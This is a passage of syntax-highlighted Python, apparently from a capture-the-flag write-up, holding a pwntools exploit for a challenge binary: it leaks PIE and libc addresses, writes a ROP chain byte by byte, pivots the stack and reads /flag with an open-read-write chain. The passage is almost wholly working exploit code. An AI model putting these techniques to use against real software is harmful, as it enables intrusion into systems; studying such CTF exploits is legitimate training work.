+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span><span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=s1>&#39;./pwn&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc6_2.39-0ubuntu8.6_amd64.so&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=n>choice</span> <span class=o>=</span> <span class=mh>0x001</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>choice</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-13470b3c3e.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sa</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span>     <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>itr</span>     <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>uu32</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u32</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>uu64</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>uru64</span>   <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:])</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span>               <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>name</span><span class=p>))))</span>
+</span></span><span class=line><span class=cl><span class=n>libc_os</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                <span class=p>:</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>x</span>
+</span></span><span class=line><span class=cl><span class=n>clear</span>       <span class=o>=</span>       <span class=k>lambda</span>                            <span class=p>:</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;clear&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_sb</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>choice</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span>  
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>commend</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>b *$rebase(0x0000000000001A6B)
+</span></span></span><span class=line><span class=cl><span class=s1>b *$rebase(0x000000000000131E)
+</span></span></span><span class=line><span class=cl><span class=s1>b _IO_getline
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Enter magic number:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;12803159&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#11ff414141414141&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2445454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39; handler=&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pie_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>rl</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x00000000000018C0</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>pie_base</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;pie_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x000000000000101a</span> 
+</span></span><span class=line><span class=cl><span class=n>ret_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>ret</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000001557</span>
+</span></span><span class=line><span class=cl><span class=n>rdi_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>rdi</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span>
+</span></span><span class=line><span class=cl><span class=n>puts_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>puts_got</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>fgets_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>fgets</span>
+</span></span><span class=line><span class=cl><span class=n>fgets_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>fgets_got</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>puts</span>
+</span></span><span class=line><span class=cl><span class=n>puts_p</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>puts_plt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>set_puts</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000016F0</span>
+</span></span><span class=line><span class=cl><span class=n>set_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>set_puts</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pop_rbp</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000001693</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rbp</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>pop_rbp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x000000000000130F</span>
+</span></span><span class=line><span class=cl><span class=n>main_b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>main</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>input_addr</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6088</span>
+</span></span><span class=line><span class=cl><span class=n>input_addr</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>input_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#10ff&#39;</span> <span class=o>+</span> <span class=n>ret_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>4</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#21&#39;</span> <span class=o>+</span><span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>rdi_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>6</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#22&#39;</span> <span class=o>+</span> <span class=n>rdi_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>10</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>fgets_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>8</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#23&#39;</span> <span class=o>+</span> <span class=n>fgets_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>8</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>puts_p</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>10</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#24&#39;</span> <span class=o>+</span> <span class=n>puts_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>6</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>pop_rbp</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>12</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#25&#39;</span> <span class=o>+</span> <span class=n>pop_rbp</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>4</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>input_addr</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>14</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#26&#39;</span> <span class=o>+</span> <span class=n>input_addr</span><span class=o>.</span><span class=n>hex</span><span class=p>()[</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#27&#39;</span> <span class=o>+</span> <span class=n>main_b</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#28&#39;</span> <span class=o>+</span> <span class=s1>&#39;00&#39;</span> <span class=o>+</span> <span class=s1>&#39;454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2945454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2a45454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2b45454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2c45454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2d45454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2e45454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2f45454545454545&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2146464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2246464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2346464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2446464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2546464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2646464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2746464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2846464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2946464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2a46464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2b46464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2c46464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2d46464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2e46464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2f46464646464646&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2147474747474747&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2247474747474747&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2347474747474747&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2447474747474747&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2547474747474747&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#264747474747&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gad</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x00000000000012d3</span> <span class=c1>#  push rdi ; pop rsp ; ret</span>
+</span></span><span class=line><span class=cl><span class=n>gadge</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>gad</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 后续是 p__puts_w </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># debug(commend)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#27&#39;</span> <span class=o>+</span> <span class=n>gadge</span><span class=o>.</span><span class=n>hex</span><span class=p>()[:</span><span class=o>-</span><span class=mi>4</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>fgets_addr</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>rl</span><span class=p>()[</span><span class=mi>1</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>fgets_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;fgets&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>o</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=n>w</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x0000000000001555</span>
+</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x000000000000101a</span>
+</span></span><span class=line><span class=cl><span class=n>rbx</span> <span class=o>=</span> <span class=n>libc_os</span><span class=p>(</span><span class=mh>0x00000000000586e4</span><span class=p>)</span> <span class=c1>#  pop rbx ; ret</span>
+</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=n>libc_os</span><span class=p>(</span><span class=mh>0x00000000000b0133</span><span class=p>)</span> <span class=c1>#  mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>*</span><span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6188</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>o</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6288</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rbx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>r</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=n>pie_base</span> <span class=o>+</span> <span class=mh>0x6288</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rbx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>w</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/flag</span><span class=se>\x00\x00\x00</span><span class=s1>&#39;</span>
